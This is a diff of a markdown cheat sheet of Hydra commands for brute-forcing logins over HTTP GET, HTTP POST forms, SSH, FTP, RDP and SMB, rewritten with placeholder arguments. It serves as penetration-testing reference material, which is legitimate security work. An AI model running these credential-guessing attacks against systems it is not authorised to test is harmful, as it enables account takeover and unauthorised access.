@@ -17,37 +17,42 @@ hydra -h
 
 Bruteforce HTTP-Get (username:password)
 ```sh
-hydra -C wordlist.txt <ip> -s <port> http-get /
+hydra -C <wordlist> <ip> -s <port> http-get /
 ```
 
 Bruteforce Username HTTP-Get
 ```sh
-hydra -L user.list -p password -f <ip> -s <port> http-get /
+hydra -L <username-list> -p <password> -f <ip> -s <port> http-get /
 ```
 
 Bruteforce Password HTTP-Get
 ```sh
-hydra -l username -P password.list -f <ip> -s <port> http-get /
+hydra -l <username> -P <password-list> -f <ip> -s <port> http-get /
 ```
 
 Bruteforce POST form
 ```sh
-hydra -l admin -P wordlist.txt <ip> -s <port> http-post-form "/<page>:<username-post-data>=^USER^&<password-post-data>=^PASS^:F=<string-logged-out>"
+hydra -l <username -P <password-list> <ip> -s <port> http-post-form "/<page>:<username-post-data>=^USER^&<password-post-data>=^PASS^:F=<string-logged-out>"
 ```
 
 Bruteforce SSH
 ```sh
-hydra -L user.list -P password.list ssh://<ip>
+hydra -L <username-list> -P <password-list> ssh://<ip> -t 4
+```
+
+Bruteforce FTP
+```sh
+hydra -l <username> -P <password-list> ftp://<ip>
 ```
 
 Bruteforce RDP
 ```sh
-hydra -L user.list -P password.list rdp://<ip>
+hydra -L <username-list> -P <password-list> rdp://<ip>
 ```
 
 Bruteforce SMB
 ```sh
-hydra -L user.list -P password.list smb://<ip>
+hydra -L <username-list> -P <password-list> smb://<ip>
 ```
 
 Stop after successful login
